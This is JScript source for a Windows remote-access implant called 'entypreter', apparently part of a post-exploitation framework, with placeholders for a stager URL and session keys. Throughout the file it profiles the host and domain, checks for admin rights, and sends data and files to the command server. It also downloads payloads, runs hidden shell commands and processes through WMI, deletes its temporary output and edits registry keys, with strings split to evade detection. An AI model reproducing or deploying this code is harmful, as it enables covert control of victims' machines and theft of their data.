var entypreter = {};

entypreter.FS = new ActiveXObject("Scripting.FileSystemObject");
entypreter.WS = new ActiveXObject("WScrip"+"t.Shell");
entypreter.STAGER = "~URL~";
entypreter.SESSIONKEY = "~SESSIONKEY~";
entypreter.JOBKEY = "~JOBKEY~";
entypreter.JOBKEYPATH = "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=";
entypreter.EXPIRE = "~_EXPIREEPOCH_~";

/**
 * Sleeps the current thread
 *
 * @param int ms - how long to sleep in milliseconds
 * @param function callback - where to continue execution after the sleep
 *
 * @return void
 */
 //sleep.start
entypreter.sleep = function(ms, callback)
{
    if (entypreter.isHTA())
    {
        window.setTimeout(callback, ms);
    }
    else
    {
        var now = new Date().getTime();
        while (new Date().getTime() < now + ms);
        callback();
    }
}
//sleep.end

/**
 * Attempts to kill the current process using a myriad of methods
 *
 * @return void
 */
//exit.start
entypreter.exit = function()
{
    if (entypreter.isHTA())
    {
        // crappy hack?
        try {
          window.close();
        } catch(e){}

        try {
          window.self.close();
        } catch (e){}

        try {
          window.top.close();
        } catch (e){}


        try{
            self.close();
        } catch (e){}

        try
        {
            window.open('', '_se'+'lf', '');
            window.close();
        }
        catch (e)
        {
        }
    }

    try
    {
        WScript.quit();
    }
    catch (e)
    {
    }

    try
    {
        var pid = entypreter.process.currentPID();
        entypreter.process.kill(pid);
    }
    catch (e)
    {
    }
}
//exit.end

/**
 * Determine if running in HTML Application context
 *
 * @return bool - true if HTML application context
 */
//isHTA.start
entypreter.isHTA = function()
{
    return typeof(window) !== "undefined";
}
//isHTA.end

/**
 * Determine if running in WScript Application context
 *
 * @return bool - true if WScript context
 */
 //isWScript.start
entypreter.isWScript = function()
{
    return typeof(WScript) !== "undefined";
}
//isWScript.end
//uuid.start
entypreter.uuid = function()
{
    try
    {
        function s4()
        {
            return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
        }
        return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
            s4() + '-' + s4() + s4() + s4();
    }
    catch(e)
    {
    }
}
//uuid.end

entypreter.user = {};

//user.isElevated.start
entypreter.user.isElevated = function()
{
    try
    {
        var res = entypreter.shell.exec("net pause lanmanserver", "%TEMP%\\"+entypreter.uuid()+".txt");
        if (res.indexOf("5") == -1)
            return true;
        else
            return false;
    }
    catch(e)
    {
        return false;
    }
}
//user.isElevated.end
//user.OS.start
entypreter.user.OS = function()
{
    try
    {
        // var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
        // var colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");
        // var enumItems = new Enumerator(colItems);
        // var objItem = enumItems.item();
        var osver = entypreter.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName");
        var #osbuild# = entypreter.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentBuildNumber");
        return osver+"***"+#osbuild#;
    }
    catch(e){}

    return "Unknown";
}
//user.OS.end
//user.DC.start
entypreter.user.DC = function()
{
    try
    {
        var DC = entypreter.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\DCName");
        if (DC.length > 0)
        {
            //DC += "___" + entypreter.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\MachineDomain")
            //DC += entypreter.user.ParseDomainAdmins(entypreter.shell.exec("net group \"Domain Admins\" /domain", "%TEMP%\\das.txt"));
            return DC;
        }
    }
    catch(e)
    {
    }
    return "Unknown";

}
//user.DC.end

/*entypreter.user.ParseDomainAdmins = function(results)
{
    try
    {
        var domain = results.split("domain controller for domain ")[1].split(".\r\n")[0];
        var retstring = "___" + domain;
        var parse1 = results.split("-------\r\n")[1].split("The command completed successfully.")[0];
        var parse2 = parse1.split("\r\n");
        var tmp = [];
        for(var i = 0; i < parse2.length; i++)
        {
            tmp = parse2[i].split(" ");
            for(var j = 0; j < tmp.length; j++)
            {
                if(tmp[j])
                {
                    retstring += "___" + tmp[j].toLowerCase();
                }
            }
        }
    }
    catch(e)
    {
    }
    return retstring;
}*/
//user.Arch.start
entypreter.user.Arch = function()
{
    try
    {
        // var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
        // var colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");

        // var enumItems = new Enumerator(colItems);
        // var objItem = enumItems.item();
        var arch = entypreter.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\\PROCESSOR_ARCHITECTURE");
        return arch;
    }
    catch(e){}

    return "Unknown";
}
//user.Arch.end
//user.CWD.start
entypreter.user.CWD = function()
{
    try
    {
        var cwd = entypreter.shell.exec("cd", "%TEMP%\\cwd.txt");
        return cwd;
    }
    catch(e)
    {}

    return "";
}
//user.CWD.end
//user.IPAddrs.start
/*
entypreter.user.IPAddrs = function()
{
    var interfaces = entypreter.shell.exec("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\interfaces", "%TEMP%\\"+entypreter.uuid()+".txt");
    var interfacearray = interfaces.split("\n");
    var retstring = "";
    var interfaceid = "";
    for (var i=0;i<interfacearray.length-1;i++)
    {
        interfaceid = interfacearray[i].split("\\")[interfacearray[i].split("\\").length-1];
        try
        {
            var interface = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\interfaces\\"+interfaceid;
            var res = entypreter.shell.exec("reg query "+interface+" /v DhcpIPAddress", "%TEMP%\\"+entypreter.uuid()+".txt");
            retstring += res.split("REG_SZ")[1].split("\r\n")[0]+"___";
            res = entypreter.shell.exec("reg query "+interface+" /v IPAddress", "%TEMP%\\"+entypreter.uuid()+".txt");
            retstring += res.split("REG_MULTI_SZ")[1].split("\r\n")[0]+"___";
        }
        catch(e)
        {continue;}
    }
    return retstring;
}
*/

entypreter.user.IPAddrs = function()
{
    // try
    // {
    //     var ipconfig = entypreter.shell.exec("ipconfig", "%TEMP%\\"+entypreter.uuid()+".txt");
    //     var ip = ipconfig.split("  IPv4 ")[1].split(": ")[1].split("\r\n")[0];
    //     return ip;
    // }
    // catch(e)
    // {
    //     try
    //     {
    //         var ip = ipconfig.split("  IP ")[1].split(": ")[1].split("\r\n")[0];
    //         return ip;
    //     }
    //     // we might need to add more conditions :/
    //     catch(e)
    //     {}
    // }

    try
    {
        var routeprint4 = entypreter.shell.exec("route PRINT", "%TEMP%\\"+entypreter.uuid()+".txt");
        var res = routeprint4.split("\r\n");
        for (var i=0; i < res.length; i++)
        {
            line = res[i].split(" ");
            // count how many 0.0.0.0 entries in this array
            zerocount = 0;
            // count how many entries in this array aren't empty
            itemcount = 0;
            // flag for when this is the line we're looking for
            correctflag = false;
            for (var j=0; j < line.length; j++)
            {
                // empty string evals to false
                if (line[j])
                {
                    itemcount += 1;
                    // ip addr is in the 4th column
                    if (itemcount == 4 && correctflag) {
                        return line[j];
                    }
                }
                if (line[j] == "0.0.0.0")
                {
                    zerocount += 1;
                    // 2 occurances of the 'any' interface in a single line is what we're looking for
                    if (zerocount == 2)
                    {
                        correctflag = true;
                    }
                }
            }
        }
    }
    catch(e)
    {}

    return "";
}
//user.IPAddrs.end
//user.info.start
entypreter.user.info = function()
{
    var net = new ActiveXObject("WScript.Network");
    var domain = "";
    if (net.UserDomain.length != 0)
    {
        domain = net.UserDomain;
    }
    else
    {
        domain = entypreter.shell.exec("echo %userdomain%", "%TEMP%\\"+entypreter.uuid()+".txt");
        domain = domain.split(" \r\n")[0];
    }
    var info = domain + "\\" + net.Username;

    if (entypreter.user.isElevated())
        info += "*";

    var bypassio = net.ComputerName;

    info += "~~~" + bypassio;
    info += "~~~" + entypreter.user.OS();
    info += "~~~" + entypreter.user.DC();
    info += "~~~" + entypreter.user.Arch();
    info += "~~~" + entypreter.user.CWD();
    info += "~~~" + entypreter.user.IPAddrs();
    info += "~~~" + entypreter.user.encoder();
    info += "~~~" + entypreter.user.shellchcp();

    return info;
}
//user.info.end
//user.encoder.start
entypreter.user.encoder = function()
{
    try
    {
        var encoder = entypreter.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\ACP");
        return encoder;
    }
    catch(e)
    {
        return "1252";
    }
}
//user.encoder.end
//user.shellchcp.start
entypreter.user.shellchcp = function()
{
    try
    {
        var encoder = entypreter.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\OEMCP");
        return encoder;
    }
    catch(e)
    {
        return "437";
    }
}
//user.shellchcp.end

entypreter.work = {};

/*
entypreter.work.applyDefaultHeaders = function(headers)
{
    var headers = (typeof(headers) !== "undefined") ? headers : {};
    headers["SESSIONKEY"] = entypreter.SESSIONKEY;
    headers["JOBKEY"] = entypreter.JOBKEY;
}
*/

/**
 * Reports a successful message to the stager
 *
 * @param string data - The post body
 * @param map headers - Any additional HTTP headers
 *
 * @return object - the HTTP object
 */
//work.report.start
entypreter.work.report = function(data, headers)
{
    //var headers = entypreter.work.applyDefaultHeaders(headers);
    return entypreter.http.post(entypreter.work.make_url(), data, headers);
}
//work.report.end

/**
 * Reports an error condition to the stager
 *
 * @param exception e - what exception was thrown
 *
 * @return object - the HTTP object
*/
//work.error.start
entypreter.work.error = function(e)
{
    try
    {
        var headers = {};
        headers["errno"] = (e.number) ? e.number : "-1";
        headers["errname"] = (e.name) ? e.name : "Unknown";
        headers["errdesc"] = (e.description) ? e.description : "Unknown";
        return entypreter.work.report(e.message, headers);
    }
    catch (e)
    {
        // Abandon all hope ye who enter here
        // For this is where all things are left behind
    }
}
//work.error.end

/**
 * Makes the stager callhome URL for a specific jobkey
 *
 * @param string jobkey - which job to fetch
 *
 * @return string - the stager callhome URL
*/
//work.make_url.start
entypreter.work.make_url = function(jobkey)
{
    var jobkey = (typeof(jobkey) !== "undefined") ? jobkey : entypreter.JOBKEY;
    return entypreter.JOBKEYPATH + jobkey + ";";
}
//work.make_url.end
/**
 * Fetches the next job from the server
 *
 * @return object - the HTTP object
*/
//work.get.start
entypreter.work.get = function()
{
    var url = entypreter.work.make_url();
    return entypreter.http.post(url);
}
//work.get.end

/**
 * Forks a new process and runs the specific jobkey
 *
 * @param string jobkey - the job to fetch/run
 * @param bool fork32Bit - ensure new process is x86
 *
 * @return void
*/
//work.fork.start
entypreter.work.fork = function(jobkey, fork32Bit)
{
    var fork32Bit = (typeof(fork32Bit) !== "undefined") ? fork32Bit : false;

    var cmd = "~_FORKCMD_~";

    if (fork32Bit)
        cmd = entypreter.file.get32BitFolder() + cmd;

    cmd = cmd.replace("***K***", entypreter.work.make_url(jobkey));
    try {
      entypreter.WMI.createProcess(cmd);
    } catch (e) {
        entypreter.WS.Run(cmd, 0, false);
    }
}
//work.fork.end
entypreter.http = {};

//http.create.start
entypreter.http.create = function()
{
    var http = null;

    try
    {
        http = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
        http.setTimeouts(0, 0, 0, 0);
        //http = new ActiveXObject("Microsoft.XMLHTTP");
    }
    catch (e)
    {
        http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        http.setTimeouts(30000, 30000, 30000, 0)
    }

    return http;
}
//http.create.end
//http.addHeaders.start
entypreter.http.addHeaders = function(http, headers)
{
    var headers = (typeof(headers) !== "undefined") ? headers : {};

    var content = false;
    for (var key in headers)
    {
        var value = headers[key];

        http.setRequestHeader(key, value);
        if (key.toUpperCase() == "CONTENT-TYPE")
            content = true;
    }

    if (!content)
        http.setRequestHeader("Content-Type", "application/octet-stream");

    http.setRequestHeader("encoder", entypreter.user.encoder())
}
//http.addHeaders.end

//http.post.start
entypreter.http.post = function(url, data, headers)
{
    var data = (typeof(data) !== "undefined") ? data : "";
    //var http = new ActiveXObject("Microsoft.XMLHTTP");
    var http = entypreter.http.create();

    http.open("POST", url, false);
    entypreter.http.addHeaders(http, headers);
    //alert("---Making request---\n" + url + '\n' + "--Data--\n" + data);
    http.send(data);
    //alert("---Response---\n" + http.responseText)
    return http;
}
//http.post.end

//http.get.start
entypreter.http.get = function(url, headers)
{
    var http = entypreter.http.create();
    http.open("GET", url, false);
    entypreter.http.addHeaders(http, headers);
    http.send();
    return http;
}
//http.get.end

/**
 * Upload a file, off session, to stager
 *
 * @param filepath - the full path to the file to send
 * @param header_uuid - a unique identifier for this file
 * @param header_key - optional HTTP header tag to send uuid over
 *
 * @return object - the HTTP object
 *
**/
//http.upload.start
entypreter.http.upload = function(filepath, header_uuid, certutil, header_key)
{
    var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";

    var headers = {};
    headers[key] = header_uuid;

    var data = entypreter.file.readBinary(filepath, true, certutil);

    if (entypreter.user.encoder() == "936")
    {
        // do nothing
    }
    else
    {
        // we must replace null bytes or MS will cut off the body
        data = data.replace(/\\/g, "\\\\");
        data = data.replace(/\0/g, "\\0");
    }

    return entypreter.work.report(data, headers);
}
//http.upload.end
//http.download.start
entypreter.http.download = function(filepath, header_uuid, header_key)
{
    var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";

    var headers = {};
    headers[key] = header_uuid;

    return entypreter.http.downloadEx("POST", entypreter.work.make_url(), headers, filepath);
}
//http.download.end
//http.downloadEx.start
entypreter.http.downloadEx = function(verb, url, headers, path)
{
    if (verb == "GET")
    {
        var http = entypreter.http.get(url, headers);
    }
    else
    {
        var http = entypreter.http.post(url, "", headers);
    }

    var stream = new ActiveXObject("Adodb.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(http.responseBody);


    var data = entypreter.http.bin2str(stream);
    entypreter.file.write(path, data);
}
//http.downloadEx.end
//http.bin2str.start
entypreter.http.bin2str = function(stream)
{
    stream.Flush();
    stream.Position = 0;

    var bin = stream.Read();
    var rs = new ActiveXObject("Adodb.RecordSet");
    rs.Fields.Append("temp", 101+100, stream.Size);

    rs.Open();
    rs.AddNew();
    rs("temp").AppendChunk(bin);
    rs.Update();
    var data = rs.GetString();
    rs.Close();
    return data.substring(0, data.length - 1);
}
//http.bin2str.end
entypreter.process = {};

//process.currentPID.start
entypreter.process.currentPID = function()
{
    var cmd = entypreter.file.getPath("%comspec% /K hostname");
    //entypreter.WS.Run(cmd, 0, false);
    var childPid = entypreter.WMI.createProcess(cmd);

    var pid = -1;
    // there could be a race condition, but CommandLine returns null on win2k
    // and is often null on later windows with more harsh privileges

    // todo: this method is stupid. instead of using .Run, spawn a WMI process.
    // then we get child PID for free and can backtrack PPID, no race condition
    var latestTime = 0;
    var latestProc = null;

    var processes = entypreter.process.list();

    var items = new Enumerator(processes);
    while (!items.atEnd())
    {
        var proc = items.item();

        try
        {
            /*
            if (proc.Name.indexOf("cmd") != -1)
            {
                if (latestTime == 0 && proc.CreationDate)
                    latestTime = proc.CreationDate;

                if (proc.CreationDate > latestTime)
                {
                    latestTime = proc.CreationDate;
                    latestProc = proc;
                }
            }
            */
            if (proc.ProcessId == childPid)
            {
                latestProc = proc;
                break;
            }
        } catch (e)
        {
        }
        items.moveNext();
    }

    pid = latestProc.ParentProcessId;
    latestProc.Terminate();

    return pid;
}
//process.currentPID.end

//process.kill.start
entypreter.process.kill = function(pid)
{
    var processes = entypreter.process.list();

    var items = new Enumerator(processes);
    while (!items.atEnd())
    {
        var proc = items.item();

        try
        {
            if (proc.ProcessId == pid)
            {
                proc.Terminate();
                return true;
            }
        } catch (e)
        {
        }
        items.moveNext();
    }

    return false;
}
//process.kill.end

//process.list.start
entypreter.process.list = function()
{
    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
    var query = "Select * Fr"+"om Win32_Process";

    return wmi.ExecQuery(query);
}
//process.list.end

// http://apidock.com/ruby/Win32/Registry/Constants
//registry.start
entypreter.registry = {};
entypreter.registry.HKCR = 0x80000000;
entypreter.registry.HKCU = 0x80000001;
entypreter.registry.HKLM = 0x80000002;

entypreter.registry.STRING = 0;
entypreter.registry.BINARY = 1;
entypreter.registry.DWORD = 2;
entypreter.registry.QWORD = 3;

//registry.provider.start
entypreter.registry.provider = function(computer)
{
    var computer = (typeof(computer) !== "undefined") ? computer : ".";
    var reg = GetObject("winmgmts:\\\\" + computer + "\\root\\default:StdRegProv");
    return reg;
}
//registry.provider.end

//registry.write.start
entypreter.registry.write = function(hKey, path, key, value, valType, computer)
{
    var reg = entypreter.registry.provider(computer);

    reg.CreateKey(hKey, path);

    if (valType == entypreter.registry.STRING)
        reg.SetStringValue(hKey, path, key, value);
    else if (valType == entypreter.registry.DWORD)
        reg.SetDWORDValue(hKey, path, key, value);
    else if (valType == entypreter.registry.QWORD)
        reg.SetQWORDValue(hKey, path, key, value);
    else if (valType == entypreter.registry.BINARY)
        reg.SetBinaryValue(hKey, path, key, value);
}
//registry.write.end
//registry.read.start
entypreter.registry.read = function(hKey, path, key, valType, computer)
{
    var reg = entypreter.registry.provider(computer);

    var methodName = "";
    if (valType == entypreter.registry.STRING)
        methodName = "GetStringValue";
    else if (valType == entypreter.registry.DWORD)
        methodName = "GetDWORDValue";
    else if (valType == entypreter.registry.QWORD)
        methodName = "GetQWORDValue";
    else if (valType == entypreter.registry.BINARY)
        methodName = "GetBinaryValue";

    if (methodName == "")
        return;

    var method = reg.Methods_.Item(methodName);
    var inparams = method.InParameters.SpawnInstance_();

    inparams.hDefKey = hKey;
    inparams.sSubKeyName = path;
    inparams.sValueName = key;

    var outparams = reg.ExecMethod_(method.Name, inparams);

    return outparams;
}
//registry.read.end
//registry.destroy.start
entypreter.registry.destroy = function(hKey, path, key, computer)
{
    var reg = entypreter.registry.provider(computer);
    var loc = (key == "") ? path : path + "\\" + key;
    return reg.DeleteKey(hKey, loc);
}
//registry.destroy.end
/*
// DEPRECATED
entypreter.registry.create = function(hiveKey, path, key, computer)
{
    var computer = (typeof(computer) !== "undefined") ? computer : ".";
    var sw = new ActiveXObject("WbemScripting.SWbemLocator");
    var root = sw.ConnectServer(computer, "root\\default");
    var reg = root.get("StdRegProv");

    var enumKey = reg.Methods_.Item("EnumKey");

    var inParams = enumKey.InParameters.SpawnInstance_();
    inParams.hDefKey = hiveKey;
    inParams.sSubKeyName = path;

    var outParam = reg.ExecMethod_(enumKey.Name, inParams);

    if (outParam.ReturnValue != 0)
        return false;

    if (outParam.sNames)
    {
        var subKeys = outParam.sNames.toArray();

        for (var i = 0; i < subKeys.length; ++i)
        {
            if (subkeys[i].toUpperCase() == key.toUpperCase())
                return true;
        }
    }

    var createKey = reg.Methods_.Item("CreateKey");
    var createArgs = createKey.InParameters.SpawnInstance_();
    createArgs.hDefKey = hiveKey;
    createArgs.sSubKeyName = path + "\\" + key;

    var createRet = reg.ExecMethod_(createKey.Name, createArgs);
    return createRet.returnValue == 0;
}
*/
//registry.end

entypreter.WMI = {};

//WMI.createProcess.start
entypreter.WMI.createProcess = function(cmd)
{
    var SW_HIDE = 0;
    var pid = 0;

    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")

    var si = wmi.Get("Win"+"32_ProcessStartup").SpawnInstance_();
    si.ShowWindow = SW_HIDE;
    si.CreateFlags = 16777216;
    si.X = si.Y = si.XSize = si.ySize = 1;

    //wmi.Get("Win32_Process").Create(cmd, null, si, pid);
    var w32proc = wmi.Get("Win32_Process");

    var method = w32proc.Methods_.Item("Create");
    var inParams = method.InParameters.SpawnInstance_();
    inParams.CommandLine = cmd;
    inParams.CurrentDirectory = null;
    inParams.ProcessStartupInformation = si;

    var outParams = w32proc.ExecMethod_("Create", inParams);
    return outParams.ProcessId;
}
//WMI.createProcess.end

entypreter.shell = {};
//shell.exec.start
entypreter.shell.exec = function(cmd, stdOutPath)
{
    cmd = "chcp " + entypreter.user.shellchcp() + " & " + cmd;
    var c = "%comspec% /q /c " + cmd + " 1> " + entypreter.file.getPath(stdOutPath);
    c += " 2>&1";
    entypreter.WS.Run(c, 0, true);
    if (entypreter.user.encoder() == "936")
    {
        var data = entypreter.file.readText(stdOutPath);
    }
    else
    {
        var data = entypreter.file.readBinary(stdOutPath);
    }
    entypreter.file.deleteFile(stdOutPath);

    return data;
}
//shell.exec.end
//shell.run.start
entypreter.shell.run = function(cmd, fork)
{
    var fork = (typeof(fork) !== "undefined") ? fork : true;
    var c = "%comspec% /q /c " + cmd;
    entypreter.WS.Run(cmd, 5-5, !fork);
}
//shell.run.end

entypreter.file = {};

//file.getPath.start
entypreter.file.getPath = function(path)
{
    return entypreter.WS.ExpandEnvironmentStrings(path);
}
//file.getPath.end

/**
* @return string - the system folder with x86 binaries
*/
//file.get32BitFolder.start
entypreter.file.get32BitFolder = function()
{
    var base = entypreter.file.getPath("%WINDIR%");
    var syswow64 = base + "\\SysWOW64\\";

    if (entypreter.FS.FolderExists(syswow64))
        return syswow64;

    return base + "\\System32\\";
}
//file.get32BitFolder.end
//file.readText.start
entypreter.file.readText = function(path)
{
    var loopcount = 0;
    while(true)
    {
        if (entypreter.FS.FileExists(entypreter.file.getPath(path)) && entypreter.FS.GetFile(entypreter.file.getPath(path)).Size > 0)
        {
            var fd = entypreter.FS.OpenTextFile(entypreter.file.getPath(path), 1, false, 0);
            var data = fd.ReadAll();
            fd.Close();
            return data;
        }
        else
        {
            loopcount += 1;
            if (loopcount > 180)
            {
                return "";
            }
            entypreter.shell.run("ping 127."+"0.0.1 -n 2", false);
        }
    }
}
//file.readText.end
//file.readBinary.start
entypreter.file.readBinary = function(path, exists, certutil)
{
    var exists = (typeof(exists) !== "undefined") ? exists : false;
    var certutil = (typeof(exists) !== "undefined") ? certutil : false;

    if (!entypreter.FS.FileExists(entypreter.file.getPath(path)) && exists)
    {
        var headers = {};
        headers["Status"] = "NotExist";
        entypreter.work.report("", headers);
        return "";
    }

    var loopcount = 0;
    while(true)
    {

        if (entypreter.FS.FileExists(entypreter.file.getPath(path)) && entypreter.FS.GetFile(entypreter.file.getPath(path)).Size > 0)
        {
            if (entypreter.user.encoder() == "936" || certutil)
            {
                var newout = "%TEMP%\\"+entypreter.uuid()+".t"+"xt";
                entypreter.shell.run("whoami");
                entypreter.shell.run("certut"+"il -encode "+entypreter.file.getPath(path)+" "+newout);
                var data = entypreter.file.readText(newout);
                entypreter.file.deleteFile(newout);
            }
            else
            {
                var fp = entypreter.FS.GetFile(entypreter.file.getPath(path));
                var fd = fp.OpenAsTextStream();
                var data = fd.read(fp.Size);
                fd.close();
            }
            return data;
        }
        else
        {
            loopcount += 1;
            if (loopcount > 180)
            {
                return "";
            }
            entypreter.shell.run("ping 127."+"0.0.1 -n 2", false);
        }
    }
}

//file.readBinary.end
//file.write.start
entypreter.file.write = function(path, data)
{
    var fd = entypreter.FS.CreateTextFile(entypreter.file.getPath(path), true);
    fd.write(data);
    fd.close();
}
//file.write.end
//file.deleteFile.start
entypreter.file.deleteFile = function(path)
{
    entypreter.FS.DeleteFile(entypreter.file.getPath(path), true);
};
//file.deleteFile.end
